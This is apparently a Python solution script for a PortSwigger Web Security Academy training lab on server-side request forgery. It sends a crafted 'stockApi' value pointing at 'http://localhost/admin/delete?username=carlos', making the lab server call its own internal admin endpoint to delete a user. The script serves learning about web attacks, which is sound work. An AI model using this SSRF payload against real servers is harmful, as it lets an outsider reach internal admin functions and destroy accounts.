#https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-common-ssrf-attacks/ssrf/lab-basic-ssrf-against-localhost#
import requests

URL = 'https://0a28006904069b00844559bb008200e4.web-security-academy.net'
client = requests.sessions.Session()
stock_url = URL + "/product/stock"
client.get(url=URL)
data ={
    'stockApi':'http://localhost/admin/delete?username=carlos'
}
r = client.post(url=stock_url, data=data, allow_redirects=False)
print(r.status_code)
